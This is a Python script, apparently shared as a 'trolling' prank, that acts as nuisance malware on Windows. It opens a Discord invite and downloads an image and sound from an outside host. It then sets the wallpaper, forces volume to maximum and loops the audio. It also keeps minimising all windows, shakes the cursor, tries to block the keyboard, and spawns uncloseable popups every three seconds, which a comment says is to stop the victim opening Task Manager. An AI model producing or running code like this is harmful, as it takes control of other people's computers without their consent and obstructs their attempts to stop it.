import os
import ctypes
import requests
import winsound
import threading
import tkinter as tk
from time import sleep
import pygetwindow as gw
import random
import webbrowser
import win32api
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from pynput import keyboard

# urls for the resources (you can replace for any sound or background easily)
# this makes the program load slow asf
background_url = 'https://easyswipe.shop/trolling/takemymeds.jpg'
audio_url = 'https://easyswipe.shop/trolling/takemymeds.wav'
discord_url = 'https://discord.gg/yTTUJcChqg'

# paths to save the resources
background_path = os.path.join(os.environ['TEMP'], 'prank_background.jpg')
audio_path = os.path.join(os.environ['TEMP'], 'prank_sound.wav')

# download the background image
def download_image(url, path):
    response = requests.get(url)
    with open(path, 'wb') as file:
        file.write(response.content)

# download the audio file
def download_audio(url, path):
    response = requests.get(url)
    with open(path, 'wb') as file:
        file.write(response.content)

# change the desktop background
def set_background(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

# play the audio file in a loop
def play_audio(audio_path):
    while True:
        winsound.PlaySound(audio_path, winsound.SND_FILENAME)

# minimize all windows
def minimize_windows():
    while True:
        for window in gw.getWindowsWithTitle(''):
            window.minimize()
        sleep(1)

# create the uncloseable text popup
def create_popup():
    root = tk.Tk()
    root.overrideredirect(True)  
    root.attributes("-topmost", True)
    root.attributes("-transparentcolor", "white")  

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    popup_width = 600  
    popup_height = 100
    x = (screen_width // 2) - (popup_width // 2)
    y = (screen_height // 2) - (popup_height // 2)
    root.geometry(f"{popup_width}x{popup_height}+{x}+{y}")

    label = tk.Label(root, text="TAKE MY MEDS THEN I GOTO BED", font=("Helvetica", 20), fg="red", bg="white") #swap words to anything
    label.pack(expand=True, fill='both')
    root.protocol("WM_DELETE_WINDOW", lambda: None)  
    root.mainloop()

# disable the keyboard (not really working)
def on_press(key):
    return key != keyboard.Key.f11  

def disable_keyboard():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# shake the cursor
def shake_cursor():
    while True:
        x, y = win32api.GetCursorPos()
        new_x = x + random.randint(-20, 20)  # increase the shake range
        new_y = y + random.randint(-20, 20)  # increase the shake range
        win32api.SetCursorPos((new_x, new_y))
        sleep(0.05)

# set volume to maximum
def set_max_volume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)  # set volume to 100%

# show popup every 3 seconds (spams windows to prevent opening task manager)
def show_popup():
    while True:
        sleep(3)
        threading.Thread(target=create_popup).start()

# open discord url
def open_discord():
    webbrowser.open(discord_url, new=0)  # open URL in the default browser (causes program crash on systems with no browser)

# main function
def main():
    open_discord()  # open the Discord URL

    download_image(background_url, background_path)
    download_audio(audio_url, audio_path)

    set_background(background_path)
    set_max_volume()

    # start everything
    threading.Thread(target=minimize_windows).start()
    threading.Thread(target=play_audio, args=(audio_path,)).start()
    threading.Thread(target=show_popup).start()
    threading.Thread(target=shake_cursor).start()
    disable_keyboard()

if __name__ == "__main__":
    main()
